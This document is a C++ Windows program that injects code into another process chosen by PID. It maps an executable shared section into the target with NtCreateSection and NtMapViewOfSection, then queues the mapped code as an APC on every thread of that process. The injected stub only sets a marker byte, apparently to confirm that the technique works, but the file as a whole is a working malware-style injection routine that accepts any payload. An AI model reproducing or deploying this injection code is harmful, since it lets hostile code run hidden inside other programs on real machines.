#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
typedef LONG NTSTATUS;
int wmain(int argc, wchar_t** argv){
 FILE* f=nullptr; _wfopen_s(&f,L"C:\\Users\\User\\trackA\\apc.log",L"a");
#define L(...) do{ wprintf(__VA_ARGS__); if(f) fwprintf(f,__VA_ARGS__);}while(0)
 DWORD pid=(DWORD)_wtoi(argv[1]);
 auto NtCS=(NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtCreateSection");
 auto NtMVS=(NTSTATUS(NTAPI*)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG))GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtMapViewOfSection");
 auto NtQAPC=(NTSTATUS(NTAPI*)(HANDLE,PVOID,PVOID,PVOID,PVOID))GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtQueueApcThread");
 HANDLE h=OpenProcess(0x43A,FALSE,pid);
 L(L"open=%p err=%lu\n",h,h?0:GetLastError());
 if(!h) return 1;
 HANDLE sec=nullptr; LARGE_INTEGER sz{}; sz.QuadPart=0x2000;
 NTSTATUS st=NtCS(&sec,0xF001F,nullptr,&sz,PAGE_EXECUTE_READWRITE,SEC_COMMIT,nullptr);
 PVOID gbase=nullptr; SIZE_T gvs=0;
 if(sec) st=NtMVS(sec,h,&gbase,0,0,nullptr,&gvs,1,0,PAGE_EXECUTE_READWRITE);
 L(L"section=%p gbase=%p gvs=%llu st=0x%08lX\n",sec,gbase,(unsigned long long)gvs,(unsigned long)st);
 PVOID lbase=nullptr; SIZE_T lvs=0;
 if(sec) st=NtMVS(sec,GetCurrentProcess(),&lbase,0,0,nullptr,&lvs,1,0,PAGE_EXECUTE_READWRITE);
 L(L"lbase=%p lvs=%llu st=0x%08lX\n",lbase,(unsigned long long)lvs,(unsigned long)st);
 if(!gbase||!lbase){ if(f)fclose(f); return 2; }
 unsigned char code[]={0xC6,0x05,0,0,0,0,0x01,0xC3};
 *(int*)(code+2)=(int)((unsigned long long)gbase+0x100 - ((unsigned long long)gbase+7));
 memcpy(lbase,code,sizeof(code));
 ((volatile unsigned char*)lbase)[0x100]=0;
 HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
 int queued=0, okcnt=0;
 if(snap!=INVALID_HANDLE_VALUE){ THREADENTRY32 te{sizeof(te)};
   if(Thread32First(snap,&te)) do{ if(te.th32OwnerProcessID!=pid) continue;
     HANDLE th=OpenThread(THREAD_ALL_ACCESS,FALSE,te.th32ThreadID);
     if(!th) continue;
     NTSTATUS q=NtQAPC(th,gbase,nullptr,nullptr,nullptr);
     if(q==0) queued++;
     if(okcnt<6) L(L"apc tid=%lu st=0x%08lX\n",(unsigned long)te.th32ThreadID,(unsigned long)q);
     okcnt++;
     CloseHandle(th);
   }while(Thread32Next(snap,&te));
   CloseHandle(snap);
 }
 L(L"threads=%d queued=%d\n",okcnt,queued);
 int seen=0;
 for(int i=0;i<40;i++){ Sleep(50); if(((volatile unsigned char*)lbase)[0x100]){ seen=1; break; } }
 L(L"APC_EXEC=%d\n",seen);
 if(h)CloseHandle(h); if(sec)CloseHandle(sec); if(f)fclose(f); return 0;
}
